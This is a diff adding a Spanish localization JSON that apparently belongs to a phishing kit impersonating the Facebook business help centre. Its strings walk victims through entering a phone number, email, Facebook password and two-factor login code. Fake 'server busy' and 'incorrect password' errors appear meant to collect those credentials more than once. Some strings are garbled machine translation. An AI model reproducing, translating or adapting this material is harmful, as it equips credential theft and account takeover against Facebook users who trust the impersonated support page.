@@ -1,0 +1,59 @@
+{
+  "translation": {
+    "title": "Centro de ayuda para empresas de Facebook",
+    "title2": "Vender a través de Facebook",
+    "very_phone": "Por favor ingrese un número de teléfono válido.",
+    "banner-content": "A través del agente del centro",
+    "description": "como podemos ayudarte?",
+    "description2": "¿Cómo podemos ayudar?",
+    "text": "Necesitamos más información para resolver su problema. ",
+    "label": "Los problemas más comunes",
+    "btn": "Me han bloqueado el uso de una función",
+    "btn1": "mi cuenta esta restringida",
+    "btn2": "Mis fotos y videos violan las políticas.",
+    "btn3": "Mi sitio está restringido",
+    "btn4": "Necesito asegurar mi cuenta",
+    "btn5": "Otros problemas",
+    "button": "Próximo",
+    "form-title": "Consigue ayuda",
+    "phone": "Número de teléfono",
+    "text-batbuoc": "pedido",
+    "email": "Dirección de correo electrónico",
+    "form2-title2": "Por favor ingresa tu contraseña de facebook para continuar",
+    "form2-content": "Necesitamos confirmar que la persona que envía la información eres tú. Introduce tu contraseña de Facebook y continúa.",
+    "password": "Contraseña",
+    "validate-true": "Verificar información",
+    "chat_btn": "Empezar a chatear"
+  },
+  "frm_input1": {
+    "home_title": "Por favor ingresa tu contraseña de Facebook para continuar",
+    "modal__body-description": "Necesitamos confirmar que la persona que envía la información eres tú. Introduce tu contraseña de Facebook y continúa.",
+    "password": "Contraseña",
+    "btn_send_continue": "Continuar",
+    "validate-true": "Verificar información",
+    "text-danger": "¡El servidor está ocupado! ",
+    "text-danger1": "La contraseña es incorrecta, inténtelo de nuevo.",
+    "text-danger2": "Requiere rehacer el sistema. ",
+    "input1": "Ingrese al lío con éxito"
+  },
+  "frm_input2": {
+    "home_title": "Ingrese el código de inicio de sesión para continuar",
+    "description": "Su cuenta tiene habilitada la autenticación de dos factores, lo que requiere este paso de inicio de sesión adicional.",
+    "title": "aprobado desde otro dispositivo",
+    "description2": "Verifique la notificación de Facebook donde inició sesión en su cuenta y apruebe el inicio de sesión para continuar.",
+    "title2": "O introduce tu código de acceso",
+    "description3": "Ingrese el código de 6 a 8 dígitos desde su teléfono o la aplicación de autenticación que configuró.",
+    "button": "Enviar código",
+    "validate-true": "Verificar información",
+    "text-danger": "¡El servidor está ocupado! ",
+    "text-danger1": "La contraseña es incorrecta, inténtelo de nuevo.",
+    "text-danger2": "Requiere rehacer el sistema. ",
+    "button1": "Enviar a",
+    "placeholder": "código de inicio de sesión"
+  },
+  "notification": {
+    "text-danger1": "El código de autenticación es incorrecto, inténtalo de nuevo.",
+    "title": "Lo sentimos, esta página no existe,",
+    "title2": "Es posible que el enlace en el que hizo clic esté roto o que la página se haya eliminado."
+  }
+}
